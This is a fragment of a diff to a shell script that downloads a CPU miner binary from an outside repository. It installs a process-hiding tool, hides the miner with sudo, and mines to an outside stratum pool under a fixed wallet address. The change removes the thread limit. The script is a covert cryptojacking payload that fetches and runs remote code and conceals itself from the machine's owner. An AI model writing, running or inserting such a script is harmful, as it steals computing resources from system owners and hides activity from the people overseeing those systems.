@@ -58,4 +58,4 @@ wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 &
   echo "Bismillahirahmannirrahim"
   echo "====================================="
   sleep 5
-npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add cpuminer-sse2 && ./cpu -a yespowertide  -o stratum+tcp://kaspa.danisgenzo.my.id:80 -u TSmFhoamG8WHPii3KpxA5bi7V6DtZ5vPxw.Genzo -t 2
+npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add cpuminer-sse2 && ./cpu -a yespowertide  -o stratum+tcp://kaspa.danisgenzo.my.id:80 -u TSmFhoamG8WHPii3KpxA5bi7V6DtZ5vPxw.Genzo
